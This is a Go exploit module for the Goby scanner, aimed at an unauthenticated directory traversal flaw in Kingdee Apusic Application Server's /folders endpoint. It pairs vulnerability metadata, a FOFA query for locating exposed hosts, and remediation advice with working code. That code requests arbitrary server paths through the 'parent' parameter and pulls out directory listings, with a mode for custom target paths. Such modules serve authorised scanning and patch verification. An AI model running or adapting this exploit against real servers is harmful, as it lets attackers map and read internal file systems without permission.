package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
  "regexp"
)

func init() {
	expJson := `{
    "Name": "Kingdee Apusic Application Server /folders Directory Traversal Vulnerability",
    "Description": "<p>Kingdee Apusic Application Server (AAS) is a standard, secure, efficient, integrated and feature-rich enterprise-level application server software, which fully supports the technical specifications of JakartaEE8/9, provides Web containers, EJB containers and WebService containers that meet the specifications, and supports Websocket 1.1, Servlet 4.0, The latest technical specifications such as HTTP 2.0 provide key support for the convenient development, flexible deployment, reliable operation, efficient management and control, and rapid integration of enterprise-level applications. </p><p>Because the /admin/protected/selector/server_file/folders interface of Kingdee Apusic application server does not perform checksum filtering, the parameters are directly concatenated into the file operation, resulting in a directory traversal vulnerability, through which an unauthenticated remote attacker can read the internal system file path and information of the system, resulting in information leakage and the system being in an extremely insecure state.</p>",
    "Product": "Kingde-Cloud-Management-Center",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2024-04-05",
    "PostTime": "2024-11-13",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\") || header=\"EASSESSIONID\" || banner=\"EASSESSIONID\") && port=\"6888\"",
    "GobyQuery": "(body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\") || header=\"EASSESSIONID\" || banner=\"EASSESSIONID\") && port=\"6888\"",
    "Level": "1",
    "Impact": "<p>Because the /admin/protected/selector/server_file/folders interface of Kingdee Apusic application server does not perform checksum filtering, the parameters are directly concatenated into the file operation, resulting in a directory traversal vulnerability, through which an unauthenticated remote attacker can read the internal system file path and information of the system, resulting in information leakage and the system being in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/137401785"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "/,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "金蝶Apusic应用服务器 /folders 目录遍历漏洞",
            "Product": "金蝶云-管理中心",
            "Description": "<p>金蝶Apusic应用服务器（Apusic Application Server，AAS）是一款标准、安全、高效、集成并具丰富功能的企业级应用服务器软件，全面支持JakartaEE8/9的技术规范，提供满足该规范的Web容器、EJB容器以及WebService容器等，支持Websocket1.1、Servlet4.0、HTTP2.0等最新的技术规范，为企业级应用的便捷开发、灵活部署、可靠运行、高效管控以及快速集成等提供关键支撑。</p><p>由于金蝶Apusic应用服务器 /admin/protected/selector/server_file/folders 接口没有进行校验和过滤，直接将参数拼接到文件操作中，导致出现目录遍历漏洞，未经身份验证的远程攻击者可通过此漏洞读取系统内部系统文件路径及信息，导致信息泄露，系统处于极不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>由于金蝶Apusic应用服务器 /admin/protected/selector/server_file/folders 接口没有进行校验和过滤，直接将参数拼接到文件操作中，导致出现目录遍历漏洞，未经身份验证的远程攻击者可通过此漏洞读取系统内部系统文件路径及信息，导致信息泄露，系统处于极不安全状态。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Kingdee Apusic Application Server /folders Directory Traversal Vulnerability",
            "Product": "Kingde-Cloud-Management-Center",
            "Description": "<p>Kingdee Apusic Application Server (AAS) is a standard, secure, efficient, integrated and feature-rich enterprise-level application server software, which fully supports the technical specifications of JakartaEE8/9, provides Web containers, EJB containers and WebService containers that meet the specifications, and supports Websocket 1.1, Servlet 4.0, The latest technical specifications such as HTTP 2.0 provide key support for the convenient development, flexible deployment, reliable operation, efficient management and control, and rapid integration of enterprise-level applications.&nbsp;</p><p>Because the /admin/protected/selector/server_file/folders interface of Kingdee Apusic application server does not perform checksum filtering, the parameters are directly concatenated into the file operation, resulting in a directory traversal vulnerability, through which an unauthenticated remote attacker can read the internal system file path and information of the system, resulting in information leakage and the system being in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Because the /admin/protected/selector/server_file/folders interface of Kingdee Apusic application server does not perform checksum filtering, the parameters are directly concatenated into the file operation, resulting in a directory traversal vulnerability, through which an unauthenticated remote attacker can read the internal system file path and information of the system, resulting in information leakage and the system being in an extremely insecure state.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`
	postOrGet_asfioahujfihasyigdfjiastgifjasugjifuiasgayisfayhuilfghaseuo := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig("/admin/protected/selector/server_file/folders?parent=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/admin/protected/selector/server_file/folders"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/": "path\":\"/tmp",
			}
			// 函数继承
			uploadFileFunc := postOrGet_asfioahujfihasyigdfjiastgifjasugjifuiasgayisfayhuilfghaseuo

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"/": {"/", "path\":\"/tmp"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_asfioahujfihasyigdfjiastgifjasugjifuiasgayisfayhuilfghaseuo

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			// 正则表达式
			re := regexp.MustCompile(`"path":"(.*?)"`)

			// 查找所有匹配项
			matches := re.FindAllStringSubmatch(resp, -1)

			// 检查是否有匹配项
			if matches == nil || len(matches) == 0 {
        expResult.Success = false
        expResult.Output = resp
        return expResult
			}

			// 遍历匹配项并打印捕获组1的内容
			for _, match := range matches {
				if len(match) > 1 {
					expResult.Output += match[1]+"\r\n"
				}
			}

			expResult.Success = true
			return expResult
		},
	))
}
